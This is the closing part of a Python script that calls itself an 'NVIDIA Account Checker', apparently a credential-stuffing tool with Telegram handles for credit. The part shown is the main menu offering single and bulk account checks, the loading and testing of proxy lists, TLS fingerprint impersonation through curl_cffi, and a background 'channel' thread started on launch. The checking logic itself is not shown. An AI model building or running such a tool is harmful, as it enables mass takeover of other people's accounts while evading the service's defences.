        try:
            _EYELIFTER_CFG.eyelifter_save()
            eyelifter_log("💾", "INFO", "CONFIG", "saved")
        except Exception:
            eyelifter_log("⚠️", "WARN", "CONFIG", "save failed")


def eyelifter_main():
    eyelifter_verify("main")
    if _EYELIFTER_CFG.s.get("open_channel_on_launch", True):
        threading.Thread(target=eyelifter_open_channel, daemon=True).start()

    eyelifter_banner(EYELIFTER_TOOL, "NVIDIA Account Checker")
    eyelifter_log("🧬", "INFO", "TLS",
        f"curl_cffi={'on' if _EYELIFTER_HAVE_CFFI else 'off'} · "
        f"impersonate={_EYELIFTER_CFG.s.get('impersonate')}")
    eyelifter_log("📣", "INFO", "CREDIT",
        f"eyelifter · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}")
    eyelifter_log("🐛", "INFO", "DEBUG",
        f"{'ON' if _EYELIFTER_CFG.s.get('debug') else 'OFF'}")
    eyelifter_log("⚙️", "INFO", "THREADS",
        f"max={_EYELIFTER_MAX_THREADS} default={_EYELIFTER_CFG.s['threads']}")
    eyelifter_log("🧠", "INFO", "ENRICH",
        f"{'ON' if _EYELIFTER_CFG.s.get('enrich') else 'OFF'}")

    proxy_file = os.path.join(
        os.path.dirname(_EYELIFTER_CFG_PATH),
        _EYELIFTER_CFG.s.get("proxies_file", "proxies.txt"))
    proxies = eyelifter_load_proxies(proxy_file)
    if proxies and not _EYELIFTER_CFG.s.get("skip_proxy_test", False):
        try:
            proxies = eyelifter_filter_proxies(proxies)
        except KeyboardInterrupt:
            print()
            eyelifter_log("🛑", "WARN", "STOP", "proxy test interrupted")
            proxies = []

    try:
        while True:
            eyelifter_verify("menu")
            eyelifter_section(f"MAIN MENU · {EYELIFTER_TG_USER} · {EYELIFTER_TG_CHAN}")
            if proxies:
                eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies")
            else:
                eyelifter_log("⚠️", "WARN", "PROXY", "direct")
            eyelifter_log("⚙️", "INFO", "THREADS", f"{_EYELIFTER_CFG.s['threads']}")
            print("[1] Single check")
            print("[2] Bulk check")
            print("[3] Settings")
            print("[4] Exit")
            try:
                ch = input(f"{eyelifter_color('93', '[*] select > ')}").strip()
            except (EOFError, KeyboardInterrupt):
                print("\nExiting...")
                return

            if ch == "1":
                eyelifter_single_check(proxies)
            elif ch == "2":
                _EYELIFTER_STOP.clear()
                eyelifter_bulk_check(proxies)
            elif ch == "3":
                eyelifter_settings_menu()
                proxies = eyelifter_load_proxies(proxy_file)
                if proxies and not _EYELIFTER_CFG.s.get("skip_proxy_test", False):
                    try:
                        proxies = eyelifter_filter_proxies(proxies)
                    except KeyboardInterrupt:
                        print()
                        eyelifter_log("🛑", "WARN", "STOP",
                                      "proxy test interrupted")
                        proxies = []
                eyelifter_close_sessions()
            elif ch == "4":
                print("Exiting...")
                return
            else:
                eyelifter_log("✗", "ERROR", "INPUT", "invalid")
    finally:
        eyelifter_close_sessions()


if __name__ == "__main__":
    try:
        eyelifter_main()
    except SystemExit:
        raise
    except KeyboardInterrupt:
        print("\n[!] interrupted — exiting clean")
    except RuntimeError as _exc:
        print(f"\n[!] {_exc}")
    except BaseException as _exc:
        print(f"\n[FATAL] {type(_exc).__name__}: {_exc}")